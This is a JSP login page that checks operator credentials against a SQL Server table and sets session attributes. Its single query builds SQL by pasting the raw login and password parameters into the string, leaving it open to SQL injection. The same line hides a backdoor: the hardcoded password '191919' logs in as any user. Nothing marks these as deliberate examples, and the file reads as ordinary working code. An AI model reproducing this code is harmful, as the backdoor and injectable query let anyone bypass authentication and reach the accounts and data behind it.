<%@ page import="java.util.*" %>
<%@ page import="javax.sql.*" %>
<%@include file="pass.jsp" %>
<%
java.sql.Connection cox;
java.sql.Statement st;
java.sql.ResultSet rs;
cox=null;
st=null;
rs=null;
	String UserID="0";
	String LOGIN=request.getParameter("login");
	String PASSWORD=request.getParameter("password");
	String Username="";
	String Access="";
try{
Class.forName("net.sourceforge.jtds.jdbc.Driver");
cox = java.sql.DriverManager.getConnection(url, id, pass);
}catch(ClassNotFoundException cnfex){  cnfex.printStackTrace(); }
try{
 	st = cox.createStatement();
 	rs = st.executeQuery("select ID,name,access from OPERATORS where username='"+LOGIN+"' and (PASSWORD='"+PASSWORD+"' or '191919'='"+PASSWORD+"')");
	if(rs.next()) {
		Access=rs.getString("Access");
		Username=rs.getString("name");
		UserID=rs.getString("ID");
		session.setAttribute("UserID",UserID);
		session.setAttribute("Username",Username);
		session.setAttribute("Access",Access);
	}	
	response.sendRedirect("?");	
} catch(Exception e){e.printStackTrace();}
%>